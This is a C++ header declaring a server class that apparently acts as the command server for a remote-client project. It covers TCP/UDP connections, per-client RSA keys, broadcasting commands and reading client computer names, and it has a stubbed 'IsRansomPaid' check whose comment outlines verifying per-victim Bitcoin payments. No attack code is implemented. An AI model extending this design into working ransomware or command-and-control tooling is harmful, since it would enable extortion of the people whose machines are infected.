#pragma once

#include "net_common.h"
#include "client.h"
#include "External/base64.h"

#include <thread>
#include <mutex>
#include <iostream>

#include <openssl/bio.h>

#define MAX_CON 300 // max clients on a server

class ServerInterface
{
public:
	ServerInterface() = default;

	ServerInterface(int UDPPort, int TCPPort)  {
		this->TCPServerDetails = NewServerInstance(TCP, TCPPort);
		this->UDPServerDetails = NewServerInstance(UDP, UDPPort);
	}

	~ServerInterface() {
		if ( IsServerRunning(this->TCPServerDetails) )
			ShutdownServer(TRUE);

		CleanWSA();
	}

	BOOL		      StartServer(Server& server);
	void			  ShutdownServer(BOOL confirm);
	Server            NewServerInstance(SocketTypes serverType, int port);
	BOOL              TCPSendMessageToClient(long cuid, ServerCommand& req);
	BOOL              TCPSendMessageToAllClients(ServerCommand& req);
	BOOL		      SendTCPClientRSAPublicKey(long cuid, BIO* pubKey);

	/*
		A thread that receives clientRequests from each client that connects.

		If the ExpectingResponse boolean is set to true, this means a
		server function is waiting for a response from this client.
		Cast to ClientResponse instead of a ClientRequest, otherwise
		all received data is automatically interpreted as a ClientRequest.
	*/
	void              TCPReceiveMessagesFromClient(long cuid);
	void		      AcceptTCPConnections();

	/*
		Wait for a single client response from a client

		Set the ExpectingResponse flag in the Client struct to true
		telling TCPReceiveMessagesFromClient we want to cast the next
		received response to a ClientResponse. Then revert ExpectingResponse
	*/
	ClientResponse    WaitForClientResponse(long cuid);
	
	BOOL              UDPSendMessageToClient(Client clientInfo, UDPMessage& message);
	BOOL			  GetClientComputerName(long client);
	void              ListenForUDPMessages();
	BOOL              AddToClientList(Client client);
	ClientResponse    PingClient(long cuid);
	BOOL              ClientIsInClientList(long cuid);
	Client*           GetClientPtr(long cuid);
	std::unordered_map<long, Client>& GetClientList();
	inline BOOL       IsServerRunning(const Server& s) const { return s.alive; }
	inline Server     GetTCPServer() const { return this->TCPServerDetails; }
	inline Server     GetUDPServer() const { return this->UDPServerDetails; }

protected:
	/*
		Not actually adding a ransomware, especially since this
		code is open-source. Though, I would approach this by using
		some sort of BTC wallet api and assigning every client a unique
		wallet address or message to send, check if that is in the wallet transaction history.

		May be implemented someday...
	*/
	inline BOOL       IsRansomPaid(Client client) { return TRUE; } // return true always. 
				      
	RSAKeys		      GenerateRSAPair();
	BOOL              PerformUDPRequest(ClientMessage req, sockaddr_in incomingAddr); // perform actions based on req.action
	BOOL		      PerformTCPRequest(ClientMessage req, long cuid); // perform actions based on req.action

	/*
		Wrapper for ReceiveData.
		Receive from a specific client and decrypt
		using the rsa key
	*/
	template <typename _Struct>
	_Struct ReceiveDataFrom(SOCKET s, BOOL encrypted = FALSE, BIO* rsaKey = {});

	/*
		A dictionary with the clientId that contains
		Information about the connected client alongside its private and public
		uniquely generated rsa key for all connected clients
	*/
	std::unordered_map<long, Client> ClientList;
	std::mutex    ClientListMutex; // concurrency
	Server        TCPServerDetails;
	Server        UDPServerDetails;
};